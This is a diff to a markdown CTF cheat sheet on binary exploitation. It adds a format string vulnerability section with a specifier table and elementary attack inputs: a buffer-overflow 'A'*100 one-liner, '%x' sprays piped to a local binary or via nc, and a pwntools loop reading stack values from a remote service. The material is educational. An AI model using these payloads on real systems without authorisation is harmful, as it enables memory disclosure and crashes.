@@ -2612,11 +2612,14 @@ Buffer overflow is a type of security vulnerability that occurs when a program, 
 
 **Quick note:**
 * If some C code contains the function `gets()` or `strcpy()`, it is vulnerable to a buffer overflow attack.
-* An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in a binary to point to a different location, we can execute arbitrary code.
+* An important part of the memory we can overwrite is the instruction pointer (IP/return address), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in a binary to point to a different location, we can execute arbitrary code.
 * The top of the stack is pointed to by the SP (or stack pointer) which is called esp in 32-bit machines.
 
 ### Buffer Overflow Exploitation example
-`python -c "print ('A' * 100)" | ./<executable>`
+A very simple example of a buffer overflow exploit looks like the following:
+```bash
+python -c "print ('A' * 100)" | ./<executable>
+```
 
 ## Return Oriented Programming (ROP)
 Return Oriented Programming (ROP) works by chaining together small pieces of code, called "gadgets," that are already present in the target program's memory space to perform a series of operations that the attacker desires. Each gadget typically ends with a "return" instruction that tells the program where to continue executing code after the gadget has finished. 
@@ -2641,7 +2644,42 @@ RELRO is a security feature that makes certain sections of the program read-only
 ### Heap Exploitation
 `TO BE ADDED`
 ## Format String Vulnerability
-`TO BE ADDED`
+A format string vulnerability is a type of software vulnerability that occurs when a program uses user input to construct a format string for the `printf` or `scanf` functions without properly validating or sanitizing the input. This can allow an attacker to execute arbitrary code or read sensitive data from the program's memory. Read more about the functions [here](/More/Assembly/Common-C-functions.md).
+
+The format specifiers are the following:
+
+| Format Specifier | Description |
+|---|---|
+| %c | Character |
+| %d | Signed decimal integer |
+| %e | Scientific notation |
+| %f | Decimal floating point |
+| %g | Use the shortest representation: %e or %f |
+| %i | Signed decimal integer |
+| %o | Unsigned octal |
+| %s | String of characters |
+| %u | Unsigned decimal integer |
+| %x | Unsigned hexadecimal integer |
+| %X | Unsigned hexadecimal integer (uppercase) |
+
+### Format String Vulnerability Exploitation example
+A simple example of a format string vulnerability is the following:
+```bash
+python -c "print ('%x ' * 100)" | ./<executable> # Local
+python -c "print ('%x ' * 100)" | nc <host> <port> # Remote
+```
+
+Its also possible to brute force the stack for values. 
+```python
+from pwn import *
+
+for i in range(1, 50):
+    r = remote('<host>', <port>)
+    r.sendline('%' + str(i) + '$s')
+    print('%' + str(i) + '$s')
+    print(r.recv())
+```
+
 
 # Reverse Engineering
 ## Assembly
@@ -2699,7 +2737,7 @@ Ghidra is a software reverse engineering (SRE) framework created and maintained 
 berkankutuk@kali:~$ ghidraRun <binary file>` # opens the binary file in ghidra
 ```
 
-GUI of Ghidra
+Ghidra GUI
 ```bash
 Right click -> Patch Instruction -> Values # Patch the instruction with the given values 
 File -> Export Program -> Export as ELF # Export the binary as an ELF file
